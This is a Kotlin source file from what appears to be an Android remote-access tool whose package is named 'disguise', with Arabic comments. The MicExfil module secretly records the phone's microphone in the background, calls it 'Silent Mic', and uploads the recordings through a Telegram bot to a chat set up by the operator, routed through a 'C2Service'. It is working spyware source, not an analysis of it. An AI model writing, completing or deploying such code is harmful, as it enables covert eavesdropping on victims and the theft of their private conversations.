package com.example.disguise.control

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import com.example.disguise.core.C2Service
import com.example.disguise.core.TelegramReporter
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

/**
 * MicExfil — تسجيل الصوت من الميكروفون في الخلفية وإرساله إلى تيليجرام.
 *
 * المسار: app/src/main/java/com/example/disguise/control/MicExfil.kt
 *
 * ملاحظة: يتطلب صلاحية RECORD_AUDIO.
 * لتسجيل الصوت في الخلفية على Android 11+، يجب أن تكون الخدمة 
 * (C2Service) من نوع foregroundServiceType="microphone".
 */
object MicExfil {

    private const val TAG = "MicExfil"
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var isRecording = false

    /**
     * بدء تسجيل الصوت.
     *
     * @param context سياق التطبيق (C2Service)
     * @return true إذا بدأ التسجيل بنجاح
     */
    fun startRecording(context: Context): Boolean {
        if (isRecording) {
            Log.w(TAG, "Recording already in progress")
            return false
        }

        try {
            outputFile = File(context.cacheDir, "record_${System.currentTimeMillis()}.m4a")
            
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(outputFile!!.absolutePath)
                
                prepare()
                start()
            }

            isRecording = true
            Log.d(TAG, "Recording started: ${outputFile!!.absolutePath}")
            return true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start recording: ${e.message}", e)
            mediaRecorder?.release()
            mediaRecorder = null
            isRecording = false
            return false
        }
    }

    /**
     * إيقاف التسجيل وإرسال الملف الصوتي إلى تيليجرام.
     */
    fun stopRecordingAndSend() {
        if (!isRecording || mediaRecorder == null) {
            Log.w(TAG, "No recording in progress")
            return
        }

        try {
            mediaRecorder?.stop()
            mediaRecorder?.release()
            mediaRecorder = null
            isRecording = false

            val file = outputFile
            if (file != null && file.exists()) {
                Log.d(TAG, "Recording stopped, sending file: ${file.absolutePath}")
                sendAudioToTelegram(file)
            } else {
                Log.e(TAG, "Output file missing after stop")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop recording: ${e.message}", e)
            mediaRecorder?.release()
            mediaRecorder = null
            isRecording = false
        }
    }

    /**
     * التحقق مما إذا كان هناك تسجيل جارٍ.
     */
    fun isCurrentlyRecording(): Boolean = isRecording

    /**
     * إرسال الملف الصوتي إلى تيليجرام.
     */
    private fun sendAudioToTelegram(audioFile: File) {
        val botToken = C2Service.DEFAULT_BOT_TOKEN
        val chatId = C2Service.DEFAULT_CHAT_ID

        if (botToken == "PUT_YOUR_BOT_TOKEN_HERE" || chatId == "PUT_YOUR_CHAT_ID_HERE") {
            Log.e(TAG, "Bot token or chat ID not configured.")
            return
        }

        val reporter = TelegramReporter(botToken, chatId)

        CoroutineScope(Dispatchers.IO).launch {
            try {
                // سيتم إضافة دالة sendAudio في TelegramReporter في الخطوة التالية
                reporter.sendAudio(audioFile, caption = "🎙️ تسجيل صوتي (Silent Mic)")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send audio: ${e.message}", e)
            }
        }
    }
}
